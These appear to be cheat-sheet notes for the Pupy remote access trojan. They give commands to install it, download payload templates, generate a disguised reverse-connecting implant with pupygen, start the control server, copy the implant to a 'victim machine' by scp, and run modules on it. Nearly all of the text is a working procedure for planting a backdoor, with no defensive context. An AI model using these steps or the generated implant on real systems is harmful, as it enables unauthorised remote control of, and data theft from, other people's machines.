# Pupy
## Installing
````
git clone https://github.com/n1nj4sec/pupy
cd pupy
git submodule init 
git submodule update
cd pupy 
pip install -r requirements.txt
````
- Download templates
````
wget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz
tar xvf payload_templates.txz && mv payload_templates/* pupy/payload_templates && rm payload_templates.txz && rm -r payload_templates
````
- Create a RAT for Deployment
````
cd /path/to/pupy 
./pupygen.py -l | less -R
````
- `pupygen` with no arguments defaults to x86 Windows reverse payload on port 443
- `-f` specifies the type of payload we are generating 
- `-O` arfument can set the target operating system
````
./pupygen.py -f py -O linux -A x64 -s hide_argv,name=myRemoteAccess --randomize-hash
````
- Pupy will automatically include ip and port with the best guess if they are omitted from the implant generation command
## Set up the Server
````
./pupysh.py 
````
## Deploy the RAT
- Can place on the victim machine various ways 
````
scp ~/location-of-pupy-file username@10.10.10.10:/tmp
````
## Interactive
- Help can be accessed with command -h `netstat -h`
- List Modules 
````
list_modules
````
- To run a module use the `run` command 
````
run check_vm
````

